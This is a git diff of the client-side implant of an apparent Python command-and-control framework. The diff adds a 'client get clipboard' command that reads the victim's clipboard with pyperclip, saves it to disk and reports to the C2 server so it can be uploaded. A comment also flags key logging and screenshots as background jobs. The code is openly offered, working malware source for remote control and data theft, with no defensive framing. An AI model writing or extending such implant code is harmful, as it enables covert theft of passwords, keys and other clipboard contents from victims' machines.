@@ -5,6 +5,8 @@ Author: Davood Yahay(D.Yakuza)
 # Import os methods based on OS, use platform.system() to detect OS
 from platform import system
 
+from pyperclip import paste, PyperclipWindowsException
+
 if system() == "Windows":
     from os import getenv, chdir, path, getcwd
 elif system() == "Linux":
@@ -73,6 +75,8 @@ def get_filename(input_string):
 
 # the delay between re-connection attempts when inactive is set in settings.py
 delay = DELAY
+# Initialize that support background jobs like Clipboard stealing, Key logging and screenshots
+clipCount = 0
 
 # Better use infinity loop when add control active sessions feature in Server Side
 while True:
@@ -104,6 +108,7 @@ while True:
 
     # If we get a 204-Status Code from the Server, simply ReIterate the Loop with no sleep
     if response.status_code == 204:
+        print("[+] Server Command Command Executed and Result send to C2 Server.")
         continue
 
     # Retrieve the command from response and decode it 
@@ -291,9 +296,25 @@ while True:
         else:
             post_to_server(f"{client} is now Configured for a {delay} Seconds delay when set inactive .\n")
 
+    # the 'client get clipboard' Command allows us to Grab the client's clipboard data and save it to disk
+    elif command == "client get clipboard":
+        # Use this variable to make clipboard filename is unique
+        clipCount += 1
+
+        # Grab the client's clipboard data and save it to disk
+        with open(f"clipboard_{clipCount}.txt", "w") as fileHandle:
+            try:
+                fileHandle.write(paste())
+            except PyperclipWindowsException:
+                post_to_server("the Windows Machine is currently Locked so Can't get Clipboard now. try again later... \n")
+            else:
+                post_to_server(f"[+]-Client => clipboard_{clipCount}.txt has been Written on the Client.\n"
+                               f"[+] => Use client upload clipboard_{clipCount}.txt to get it on the C2 Server. \n")
     else:
         post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
 
-    print("[+] Command Executed and Result send to C2 Server.")
+
+    # test print
+    print("[+] OS-System Command Command Executed and Result send to C2 Server.")
 
 print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
